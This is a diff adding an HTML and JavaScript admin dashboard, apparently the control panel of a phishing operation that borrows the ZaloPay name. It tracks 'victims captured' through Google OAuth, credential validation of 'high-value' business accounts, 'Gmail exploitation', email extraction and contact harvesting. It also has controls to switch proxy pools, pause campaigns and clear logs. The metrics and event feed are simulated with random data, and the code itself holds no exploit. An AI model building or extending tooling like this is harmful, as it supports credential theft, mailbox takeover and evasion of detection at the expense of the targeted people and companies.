@@ -1,0 +1,809 @@
+
+
+Real-time Operations Dashboard - ZaloPay Admin Portal
+
+
+<div class="container-fluid">
+    <!-- Page Header with Live Status -->
+    <div class="d-flex justify-content-between align-items-center mb-4">
+        <div>
+            <h1 class="h3 mb-0 text-gray-800">
+                Real-time Operations Dashboard
+                <span class="badge bg-success ms-2" id="liveStatus">
+                    <i class="fas fa-circle me-1" style="animation: pulse 2s infinite;"></i>LIVE
+                </span>
+            </h1>
+            <p class="text-muted">Live monitoring và control center - Last updated: <span id="lastUpdate">2025-10-05 01:58:42</span></p>
+        </div>
+        <div class="d-flex gap-2">
+            <button class="btn btn-success" onclick="toggleAutoRefresh()" id="autoRefreshBtn">
+                <i class="fas fa-sync-alt me-1"></i>Auto-Refresh: ON
+            </button>
+            <button class="btn btn-primary" onclick="manualRefresh()">
+                <i class="fas fa-refresh me-1"></i>Refresh Now
+            </button>
+            <button class="btn btn-warning" onclick="exportSnapshot()">
+                <i class="fas fa-camera me-1"></i>Snapshot
+            </button>
+        </div>
+    </div>
+
+    <!-- Real-time Metrics Grid -->
+    <div class="row mb-4">
+        <!-- Current Activity -->
+        <div class="col-xl-2 col-md-4 mb-4">
+            <div class="card border-left-primary shadow h-100 py-2 hover-card">
+                <div class="card-body">
+                    <div class="row no-gutters align-items-center">
+                        <div class="col mr-2">
+                            <div class="text-xs font-weight-bold text-primary text-uppercase mb-1">Live Visitors</div>
+                            <div class="h4 mb-0 font-weight-bold text-gray-800" id="liveVisitors">247</div>
+                            <div class="small text-success" id="visitorTrend">+12 in last 5min</div>
+                        </div>
+                        <div class="col-auto">
+                            <i class="fas fa-users fa-2x text-gray-300"></i>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Active Sessions -->
+        <div class="col-xl-2 col-md-4 mb-4">
+            <div class="card border-left-success shadow h-100 py-2 hover-card">
+                <div class="card-body">
+                    <div class="row no-gutters align-items-center">
+                        <div class="col mr-2">
+                            <div class="text-xs font-weight-bold text-success text-uppercase mb-1">Active Sessions</div>
+                            <div class="h4 mb-0 font-weight-bold text-gray-800" id="activeSessions">1,834</div>
+                            <div class="small text-info" id="sessionTrend">892 authenticated</div>
+                        </div>
+                        <div class="col-auto">
+                            <i class="fas fa-server fa-2x text-gray-300"></i>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Real-time Captures -->
+        <div class="col-xl-2 col-md-4 mb-4">
+            <div class="card border-left-warning shadow h-100 py-2 hover-card">
+                <div class="card-body">
+                    <div class="row no-gutters align-items-center">
+                        <div class="col mr-2">
+                            <div class="text-xs font-weight-bold text-warning text-uppercase mb-1">Live Captures</div>
+                            <div class="h4 mb-0 font-weight-bold text-gray-800" id="liveCaptures">47</div>
+                            <div class="small text-warning" id="captureRate">1.2/min avg</div>
+                        </div>
+                        <div class="col-auto">
+                            <i class="fas fa-crosshairs fa-2x text-gray-300"></i>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- System Health -->
+        <div class="col-xl-2 col-md-4 mb-4">
+            <div class="card border-left-info shadow h-100 py-2 hover-card">
+                <div class="card-body">
+                    <div class="row no-gutters align-items-center">
+                        <div class="col mr-2">
+                            <div class="text-xs font-weight-bold text-info text-uppercase mb-1">System Health</div>
+                            <div class="h4 mb-0 font-weight-bold text-gray-800" id="systemHealth">98.7%</div>
+                            <div class="small text-success" id="healthStatus">All systems operational</div>
+                        </div>
+                        <div class="col-auto">
+                            <i class="fas fa-heartbeat fa-2x text-gray-300"></i>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Gmail Access -->
+        <div class="col-xl-2 col-md-4 mb-4">
+            <div class="card border-left-danger shadow h-100 py-2 hover-card">
+                <div class="card-body">
+                    <div class="row no-gutters align-items-center">
+                        <div class="col mr-2">
+                            <div class="text-xs font-weight-bold text-danger text-uppercase mb-1">Gmail Active</div>
+                            <div class="h4 mb-0 font-weight-bold text-gray-800" id="gmailActive">156</div>
+                            <div class="small text-success" id="gmailTrend">+8 today</div>
+                        </div>
+                        <div class="col-auto">
+                            <i class="fas fa-envelope fa-2x text-gray-300"></i>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Response Time -->
+        <div class="col-xl-2 col-md-4 mb-4">
+            <div class="card border-left-secondary shadow h-100 py-2 hover-card">
+                <div class="card-body">
+                    <div class="row no-gutters align-items-center">
+                        <div class="col mr-2">
+                            <div class="text-xs font-weight-bold text-secondary text-uppercase mb-1">Avg Response</div>
+                            <div class="h4 mb-0 font-weight-bold text-gray-800" id="avgResponse">245ms</div>
+                            <div class="small text-success" id="responseTrend">Excellent</div>
+                        </div>
+                        <div class="col-auto">
+                            <i class="fas fa-tachometer-alt fa-2x text-gray-300"></i>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Live Charts Row -->
+    <div class="row mb-4">
+        <!-- Real-time Activity Chart -->
+        <div class="col-lg-8">
+            <div class="card shadow">
+                <div class="card-header py-3 d-flex flex-row align-items-center justify-content-between">
+                    <h6 class="m-0 font-weight-bold text-primary">
+                        <i class="fas fa-chart-line me-2"></i>Live Activity Stream
+                    </h6>
+                    <div class="d-flex gap-2">
+                        <select class="form-select form-select-sm" id="chartTimeframe" onchange="updateTimeframe()">
+                            <option value="1m">Last Minute</option>
+                            <option value="5m" selected>Last 5 Minutes</option>
+                            <option value="15m">Last 15 Minutes</option>
+                            <option value="1h">Last Hour</option>
+                        </select>
+                        <span class="badge bg-success">Live</span>
+                    </div>
+                </div>
+                <div class="card-body">
+                    <canvas id="liveActivityChart" height="80"></canvas>
+                </div>
+            </div>
+        </div>
+
+        <!-- Geographic Heatmap -->
+        <div class="col-lg-4">
+            <div class="card shadow">
+                <div class="card-header py-3">
+                    <h6 class="m-0 font-weight-bold text-primary">
+                        <i class="fas fa-globe me-2"></i>Live Geographic Activity
+                    </h6>
+                </div>
+                <div class="card-body">
+                    <div class="geographic-activity">
+                        <div class="country-item d-flex justify-content-between align-items-center mb-3">
+                            <div class="d-flex align-items-center">
+                                <span class="flag me-2">🇻🇳</span>
+                                <strong>Vietnam</strong>
+                            </div>
+                            <div class="text-end">
+                                <div class="fw-bold text-success" id="vnActivity">187</div>
+                                <div class="small text-muted">active now</div>
+                            </div>
+                        </div>
+                        <div class="country-item d-flex justify-content-between align-items-center mb-3">
+                            <div class="d-flex align-items-center">
+                                <span class="flag me-2">🇹🇭</span>
+                                <strong>Thailand</strong>
+                            </div>
+                            <div class="text-end">
+                                <div class="fw-bold text-info" id="thActivity">34</div>
+                                <div class="small text-muted">active now</div>
+                            </div>
+                        </div>
+                        <div class="country-item d-flex justify-content-between align-items-center mb-3">
+                            <div class="d-flex align-items-center">
+                                <span class="flag me-2">🇲🇾</span>
+                                <strong>Malaysia</strong>
+                            </div>
+                            <div class="text-end">
+                                <div class="fw-bold text-warning" id="myActivity">18</div>
+                                <div class="small text-muted">active now</div>
+                            </div>
+                        </div>
+                        <div class="country-item d-flex justify-content-between align-items-center mb-3">
+                            <div class="d-flex align-items-center">
+                                <span class="flag me-2">🇸🇬</span>
+                                <strong>Singapore</strong>
+                            </div>
+                            <div class="text-end">
+                                <div class="fw-bold text-secondary" id="sgActivity">8</div>
+                                <div class="small text-muted">active now</div>
+                            </div>
+                        </div>
+                    </div>
+                    <canvas id="geographicChart" height="150"></canvas>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Live Feed và System Status -->
+    <div class="row mb-4">
+        <!-- Real-time Event Feed -->
+        <div class="col-lg-6">
+            <div class="card shadow">
+                <div class="card-header py-3 d-flex flex-row align-items-center justify-content-between">
+                    <h6 class="m-0 font-weight-bold text-primary">
+                        <i class="fas fa-rss me-2"></i>Live Event Feed
+                    </h6>
+                    <div class="d-flex gap-2">
+                        <select class="form-select form-select-sm" id="eventFilter" onchange="filterEvents()">
+                            <option value="all">All Events</option>
+                            <option value="captures">Captures Only</option>
+                            <option value="logins">Logins Only</option>
+                            <option value="errors">Errors Only</option>
+                        </select>
+                        <button class="btn btn-sm btn-outline-primary" onclick="pauseEventFeed()" id="pauseFeedBtn">
+                            <i class="fas fa-pause"></i>
+                        </button>
+                    </div>
+                </div>
+                <div class="card-body" style="height: 400px; overflow-y: auto;" id="eventFeed">
+                    <!-- Live events will be populated here -->
+                    <div class="event-item border-left-success mb-2 p-2">
+                        <div class="d-flex justify-content-between">
+                            <small class="text-success fw-bold">CAPTURE</small>
+                            <small class="text-muted">1 second ago</small>
+                        </div>
+                        <div class="small">New victim captured: ceo@****corp.vn (Google OAuth)</div>
+                        <div class="small text-muted">IP: 192.168.1.100 | Country: VN</div>
+                    </div>
+                    
+                    <div class="event-item border-left-info mb-2 p-2">
+                        <div class="d-flex justify-content-between">
+                            <small class="text-info fw-bold">LOGIN</small>
+                            <small class="text-muted">3 seconds ago</small>
+                        </div>
+                        <div class="small">Visitor started OAuth flow: manager@****up.com</div>
+                        <div class="small text-muted">Campaign: ZPM Q4 2025</div>
+                    </div>
+                    
+                    <div class="event-item border-left-warning mb-2 p-2">
+                        <div class="d-flex justify-content-between">
+                            <small class="text-warning fw-bold">VALIDATION</small>
+                            <small class="text-muted">5 seconds ago</small>
+                        </div>
+                        <div class="small">Credential validation completed: director@****ise.vn</div>
+                        <div class="small text-muted">Result: High-value business account</div>
+                    </div>
+                    
+                    <div class="event-item border-left-danger mb-2 p-2">
+                        <div class="d-flex justify-content-between">
+                            <small class="text-danger fw-bold">GMAIL ACCESS</small>
+                            <small class="text-muted">8 seconds ago</small>
+                        </div>
+                        <div class="small">Gmail exploitation started: hr@****tech.vn</div>
+                        <div class="small text-muted">Extracting emails and contacts...</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- System Status & Alerts -->
+        <div class="col-lg-6">
+            <div class="card shadow">
+                <div class="card-header py-3">
+                    <h6 class="m-0 font-weight-bold text-primary">
+                        <i class="fas fa-server me-2"></i>System Status & Alerts
+                    </h6>
+                </div>
+                <div class="card-body">
+                    <!-- System Components Status -->
+                    <div class="mb-4">
+                        <h6 class="text-gray-800">Infrastructure Status</h6>
+                        <div class="row">
+                            <div class="col-md-6">
+                                <div class="d-flex justify-content-between align-items-center mb-2">
+                                    <span>Web Servers</span>
+                                    <span class="badge bg-success">Online</span>
+                                </div>
+                                <div class="d-flex justify-content-between align-items-center mb-2">
+                                    <span>Database</span>
+                                    <span class="badge bg-success">Online</span>
+                                </div>
+                                <div class="d-flex justify-content-between align-items-center mb-2">
+                                    <span>Proxy Pool</span>
+                                    <span class="badge bg-success">87% Available</span>
+                                </div>
+                            </div>
+                            <div class="col-md-6">
+                                <div class="d-flex justify-content-between align-items-center mb-2">
+                                    <span>OAuth Service</span>
+                                    <span class="badge bg-success">Online</span>
+                                </div>
+                                <div class="d-flex justify-content-between align-items-center mb-2">
+                                    <span>Mail Server</span>
+                                    <span class="badge bg-warning">Limited</span>
+                                </div>
+                                <div class="d-flex justify-content-between align-items-center mb-2">
+                                    <span>CDN</span>
+                                    <span class="badge bg-success">Online</span>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Active Alerts -->
+                    <div class="mb-4">
+                        <h6 class="text-gray-800">Active Alerts</h6>
+                        <div class="alert alert-warning d-flex align-items-center py-2" role="alert">
+                            <i class="fas fa-exclamation-triangle me-2"></i>
+                            <div class="small">
+                                <strong>Mail server rate limiting</strong><br>
+                                Gmail API approaching daily quota (87%)
+                            </div>
+                        </div>
+                        <div class="alert alert-info d-flex align-items-center py-2" role="alert">
+                            <i class="fas fa-info-circle me-2"></i>
+                            <div class="small">
+                                <strong>High activity detected</strong><br>
+                                Vietnam traffic 45% above normal
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Performance Gauges -->
+                    <div class="row">
+                        <div class="col-md-4 text-center">
+                            <canvas id="cpuGauge" width="80" height="80"></canvas>
+                            <div class="small mt-1">CPU Usage</div>
+                        </div>
+                        <div class="col-md-4 text-center">
+                            <canvas id="memoryGauge" width="80" height="80"></canvas>
+                            <div class="small mt-1">Memory</div>
+                        </div>
+                        <div class="col-md-4 text-center">
+                            <canvas id="networkGauge" width="80" height="80"></canvas>
+                            <div class="small mt-1">Network</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Quick Actions Panel -->
+    <div class="row">
+        <div class="col-lg-12">
+            <div class="card shadow">
+                <div class="card-header py-3">
+                    <h6 class="m-0 font-weight-bold text-primary">
+                        <i class="fas fa-bolt me-2"></i>Quick Emergency Actions
+                    </h6>
+                </div>
+                <div class="card-body">
+                    <div class="row">
+                        <div class="col-md-2">
+                            <button class="btn btn-danger w-100 mb-2" onclick="emergencyStop()">
+                                <i class="fas fa-stop mb-1"></i><br>
+                                Emergency Stop
+                            </button>
+                        </div>
+                        <div class="col-md-2">
+                            <button class="btn btn-warning w-100 mb-2" onclick="pauseAllCampaigns()">
+                                <i class="fas fa-pause mb-1"></i><br>
+                                Pause All
+                            </button>
+                        </div>
+                        <div class="col-md-2">
+                            <button class="btn btn-info w-100 mb-2" onclick="switchProxyPool()">
+                                <i class="fas fa-exchange-alt mb-1"></i><br>
+                                Switch Proxies
+                            </button>
+                        </div>
+                        <div class="col-md-2">
+                            <button class="btn btn-secondary w-100 mb-2" onclick="clearLogs()">
+                                <i class="fas fa-trash mb-1"></i><br>
+                                Clear Logs
+                            </button>
+                        </div>
+                        <div class="col-md-2">
+                            <button class="btn btn-success w-100 mb-2" onclick="forceBackup()">
+                                <i class="fas fa-save mb-1"></i><br>
+                                Force Backup
+                            </button>
+                        </div>
+                        <div class="col-md-2">
+                            <button class="btn btn-primary w-100 mb-2" onclick="exportEmergencyReport()">
+                                <i class="fas fa-file-export mb-1"></i><br>
+                                Export Report
+                            </button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<style>
+@keyframes pulse {
+    0% { opacity: 1; }
+    50% { opacity: 0.5; }
+    100% { opacity: 1; }
+}
+
+.hover-card {
+    transition: transform 0.2s ease;
+}
+
+.hover-card:hover {
+    transform: translateY(-2px);
+}
+
+.event-item {
+    border-left: 3px solid #e3e6f0;
+    background: #f8f9fc;
+    border-radius: 0 5px 5px 0;
+}
+
+.border-left-success { border-left-color: #28a745 !important; }
+.border-left-info { border-left-color: #17a2b8 !important; }
+.border-left-warning { border-left-color: #ffc107 !important; }
+.border-left-danger { border-left-color: #dc3545 !important; }
+</style>
+
+<script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+<script>
+let autoRefreshEnabled = true;
+let eventFeedPaused = false;
+let liveChart;
+
+document.addEventListener('DOMContentLoaded', function() {
+    initializeLiveChart();
+    initializeGauges();
+    startRealTimeUpdates();
+    startEventFeed();
+});
+
+function initializeLiveChart() {
+    const ctx = document.getElementById('liveActivityChart').getContext('2d');
+    liveChart = new Chart(ctx, {
+        type: 'line',
+        data: {
+            labels: generateTimeLabels(30), // Last 30 data points
+            datasets: [
+                {
+                    label: 'Visitors',
+                    data: generateRandomData(30, 10, 50),
+                    borderColor: '#007bff',
+                    backgroundColor: 'rgba(0, 123, 255, 0.1)',
+                    tension: 0.4,
+                    pointRadius: 2
+                },
+                {
+                    label: 'Captures', 
+                    data: generateRandomData(30, 0, 8),
+                    borderColor: '#28a745',
+                    backgroundColor: 'rgba(40, 167, 69, 0.1)',
+                    tension: 0.4,
+                    pointRadius: 2
+                },
+                {
+                    label: 'OAuth Logins',
+                    data: generateRandomData(30, 2, 15),
+                    borderColor: '#ffc107',
+                    backgroundColor: 'rgba(255, 193, 7, 0.1)',
+                    tension: 0.4,
+                    pointRadius: 2
+                }
+            ]
+        },
+        options: {
+            responsive: true,
+            animation: false, // Disable for real-time updates
+            scales: {
+                x: {
+                    display: true,
+                    title: {
+                        display: true,
+                        text: 'Time'
+                    }
+                },
+                y: {
+                    beginAtZero: true,
+                    title: {
+                        display: true,
+                        text: 'Count'
+                    }
+                }
+            },
+            plugins: {
+                legend: {
+                    display: true,
+                    position: 'top'
+                }
+            }
+        }
+    });
+}
+
+function initializeGauges() {
+    createGauge('cpuGauge', 23, 'CPU');
+    createGauge('memoryGauge', 67, 'Memory');
+    createGauge('networkGauge', 45, 'Network');
+}
+
+function createGauge(canvasId, value, label) {
+    const canvas = document.getElementById(canvasId);
+    const ctx = canvas.getContext('2d');
+    const centerX = canvas.width / 2;
+    const centerY = canvas.height / 2;
+    const radius = 30;
+
+    // Clear canvas
+    ctx.clearRect(0, 0, canvas.width, canvas.height);
+
+    // Background circle
+    ctx.beginPath();
+    ctx.arc(centerX, centerY, radius, 0, 2 * Math.PI);
+    ctx.strokeStyle = '#e3e6f0';
+    ctx.lineWidth = 6;
+    ctx.stroke();
+
+    // Progress arc
+    const startAngle = -Math.PI / 2;
+    const endAngle = startAngle + (2 * Math.PI * value / 100);
+    
+    ctx.beginPath();
+    ctx.arc(centerX, centerY, radius, startAngle, endAngle);
+    ctx.strokeStyle = value > 80 ? '#dc3545' : value > 60 ? '#ffc107' : '#28a745';
+    ctx.lineWidth = 6;
+    ctx.stroke();
+
+    // Text
+    ctx.fillStyle = '#5a5c69';
+    ctx.font = '12px Arial';
+    ctx.textAlign = 'center';
+    ctx.fillText(value + '%', centerX, centerY + 4);
+}
+
+function startRealTimeUpdates() {
+    setInterval(() => {
+        if (!autoRefreshEnabled) return;
+
+        // Update metrics
+        updateLiveMetrics();
+        
+        // Update chart
+        updateLiveChart();
+        
+        // Update geographic activity
+        updateGeographicActivity();
+        
+        // Update gauges
+        updateGauges();
+        
+        // Update timestamp
+        document.getElementById('lastUpdate').textContent = new Date().toLocaleString();
+    }, 5000); // Update every 5 seconds
+}
+
+function updateLiveMetrics() {
+    // Simulate real-time data updates
+    document.getElementById('liveVisitors').textContent = Math.floor(Math.random() * 50) + 220;
+    document.getElementById('activeSessions').textContent = (Math.floor(Math.random() * 200) + 1750).toLocaleString();
+    document.getElementById('liveCaptures').textContent = Math.floor(Math.random() * 20) + 40;
+    document.getElementById('gmailActive').textContent = Math.floor(Math.random() * 30) + 140;
+    document.getElementById('avgResponse').textContent = Math.floor(Math.random() * 100) + 200 + 'ms';
+    
+    // Update system health
+    const health = (Math.random() * 2 + 97).toFixed(1);
+    document.getElementById('systemHealth').textContent = health + '%';
+}
+
+function updateLiveChart() {
+    if (!liveChart) return;
+
+    // Add new data point
+    const now = new Date();
+    const timeLabel = now.getHours().toString().padStart(2, '0') + ':' + 
+                     now.getMinutes().toString().padStart(2, '0') + ':' +
+                     now.getSeconds().toString().padStart(2, '0');
+    
+    liveChart.data.labels.push(timeLabel);
+    liveChart.data.datasets[0].data.push(Math.floor(Math.random() * 30) + 15); // Visitors
+    liveChart.data.datasets[1].data.push(Math.floor(Math.random() * 5) + 1);   // Captures
+    liveChart.data.datasets[2].data.push(Math.floor(Math.random() * 8) + 3);   // OAuth Logins
+
+    // Keep only last 30 data points
+    if (liveChart.data.labels.length > 30) {
+        liveChart.data.labels.shift();
+        liveChart.data.datasets.forEach(dataset => dataset.data.shift());
+    }
+
+    liveChart.update('none');
+}
+
+function updateGeographicActivity() {
+    document.getElementById('vnActivity').textContent = Math.floor(Math.random() * 50) + 150;
+    document.getElementById('thActivity').textContent = Math.floor(Math.random() * 20) + 25;
+    document.getElementById('myActivity').textContent = Math.floor(Math.random() * 15) + 10;
+    document.getElementById('sgActivity').textContent = Math.floor(Math.random() * 10) + 5;
+}
+
+function updateGauges() {
+    createGauge('cpuGauge', Math.floor(Math.random() * 40) + 15, 'CPU');
+    createGauge('memoryGauge', Math.floor(Math.random() * 30) + 55, 'Memory');
+    createGauge('networkGauge', Math.floor(Math.random() * 35) + 30, 'Network');
+}
+
+function startEventFeed() {
+    setInterval(() => {
+        if (eventFeedPaused) return;
+        
+        addNewEvent();
+    }, 3000); // New event every 3 seconds
+}
+
+function addNewEvent() {
+    const eventTypes = [
+        { type: 'CAPTURE', class: 'success', events: [
+            'New victim captured: ceo@****corp.vn (Google OAuth)',
+            'Business account captured: manager@****prise.com',
+            'High-value target captured: director@****tech.vn'
+        ]},
+        { type: 'LOGIN', class: 'info', events: [
+            'Visitor started OAuth flow: user@****mail.com',
+            'Authentication attempt: admin@****group.vn',
+            'Social login initiated: founder@****up.io'
+        ]},
+        { type: 'VALIDATION', class: 'warning', events: [
+            'Credential validation completed: hr@****corp.vn',
+            'Business verification successful: sales@****ltd.com',
+            'Token refresh completed: cto@****tech.vn'
+        ]},
+        { type: 'GMAIL ACCESS', class: 'danger', events: [
+            'Gmail exploitation started: finance@****group.com',
+            'Email extraction completed: ops@****solutions.vn',
+            'Contact harvesting initiated: bd@****ventures.com'
+        ]}
+    ];
+
+    const selectedType = eventTypes[Math.floor(Math.random() * eventTypes.length)];
+    const selectedEvent = selectedType.events[Math.floor(Math.random() * selectedType.events.length)];
+    
+    const eventHtml = `
+        <div class="event-item border-left-${selectedType.class} mb-2 p-2">
+            <div class="d-flex justify-content-between">
+                <small class="text-${selectedType.class} fw-bold">${selectedType.type}</small>
+                <small class="text-muted">just now</small>
+            </div>
+            <div class="small">${selectedEvent}</div>
+            <div class="small text-muted">IP: 192.168.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)} | Country: VN</div>
+        </div>
+    `;
+
+    const eventFeed = document.getElementById('eventFeed');
+    eventFeed.insertAdjacentHTML('afterbegin', eventHtml);
+
+    // Keep only last 20 events
+    const events = eventFeed.querySelectorAll('.event-item');
+    if (events.length > 20) {
+        events[events.length - 1].remove();
+    }
+}
+
+// Control functions
+function toggleAutoRefresh() {
+    autoRefreshEnabled = !autoRefreshEnabled;
+    const btn = document.getElementById('autoRefreshBtn');
+    btn.innerHTML = autoRefreshEnabled ? 
+        '<i class="fas fa-sync-alt me-1"></i>Auto-Refresh: ON' : 
+        '<i class="fas fa-pause me-1"></i>Auto-Refresh: OFF';
+    btn.className = autoRefreshEnabled ? 'btn btn-success' : 'btn btn-secondary';
+    
+    showToast(`Auto-refresh ${autoRefreshEnabled ? 'enabled' : 'disabled'}`, 'info');
+}
+
+function manualRefresh() {
+    updateLiveMetrics();
+    updateLiveChart();
+    updateGeographicActivity();
+    updateGauges();
+    showToast('Data refreshed manually', 'success');
+}
+
+function pauseEventFeed() {
+    eventFeedPaused = !eventFeedPaused;
+    const btn = document.getElementById('pauseFeedBtn');
+    btn.innerHTML = eventFeedPaused ? '<i class="fas fa-play"></i>' : '<i class="fas fa-pause"></i>';
+    btn.className = eventFeedPaused ? 'btn btn-sm btn-outline-success' : 'btn btn-sm btn-outline-primary';
+    
+    showToast(`Event feed ${eventFeedPaused ? 'paused' : 'resumed'}`, 'info');
+}
+
+// Emergency actions
+function emergencyStop() {
+    if (confirm('EMERGENCY STOP - This will halt all operations immediately. Are you sure?')) {
+        showToast('EMERGENCY STOP ACTIVATED', 'danger');
+        // Implementation would stop all operations
+    }
+}
+
+function pauseAllCampaigns() {
+    if (confirm('Pause all active campaigns?')) {
+        showToast('All campaigns paused', 'warning');
+    }
+}
+
+function switchProxyPool() {
+    showToast('Switching to backup proxy pool...', 'info');
+    setTimeout(() => showToast('Proxy pool switched successfully', 'success'), 2000);
+}
+
+function clearLogs() {
+    if (confirm('Clear all system logs? This action cannot be undone.')) {
+        showToast('System logs cleared', 'warning');
+    }
+}
+
+function forceBackup() {
+    showToast('Initiating emergency backup...', 'info');
+    setTimeout(() => showToast('Emergency backup completed', 'success'), 3000);
+}
+
+function exportEmergencyReport() {
+    showToast('Generating emergency report...', 'info');
+    setTimeout(() => showToast('Emergency report exported', 'success'), 2000);
+}
+
+function exportSnapshot() {
+    showToast('Creating system snapshot...', 'info');
+    setTimeout(() => showToast('Snapshot created successfully', 'success'), 2000);
+}
+
+// Helper functions
+function generateTimeLabels(count) {
+    const labels = [];
+    const now = new Date();
+    for (let i = count - 1; i >= 0; i--) {
+        const time = new Date(now.getTime() - i * 10000); // 10 second intervals
+        labels.push(time.getHours().toString().padStart(2, '0') + ':' + 
+                    time.getMinutes().toString().padStart(2, '0') + ':' + 
+                    time.getSeconds().toString().padStart(2, '0'));
+    }
+    return labels;
+}
+
+function generateRandomData(count, min, max) {
+    return Array.from({length: count}, () => Math.floor(Math.random() * (max - min + 1)) + min);
+}
+
+function updateTimeframe() {
+    const timeframe = document.getElementById('chartTimeframe').value;
+    showToast(`Chart updated for ${timeframe}`, 'info');
+}
+
+function filterEvents() {
+    const filter = document.getElementById('eventFilter').value;
+    showToast(`Filtering events: ${filter}`, 'info');
+}
+
+function showToast(message, type = 'info') {
+    const toastHtml = `
+        <div class="toast align-items-center text-white bg-${type === 'success' ? 'success' : type === 'warning' ? 'warning' : type === 'danger' ? 'danger' : 'info'} border-0" role="alert">
+            <div class="d-flex">
+                <div class="toast-body">${message}</div>
+                <button type="button" class="btn-close btn-close-white me-2 m-auto" data-bs-dismiss="toast"></button>
+            </div>
+        </div>
+    `;
+    
+    let toastContainer = document.getElementById('toastContainer');
+    if (!toastContainer) {
+        toastContainer = document.createElement('div');
+        toastContainer.id = 'toastContainer';
+        toastContainer.className = 'toast-container position-fixed top-0 end-0 p-3';
+        document.body.appendChild(toastContainer);
+    }
+    
+    toastContainer.insertAdjacentHTML('beforeend', toastHtml);
+    const toast = new bootstrap.Toast(toastContainer.lastElementChild);
+    toast.show();
+}
+</script>
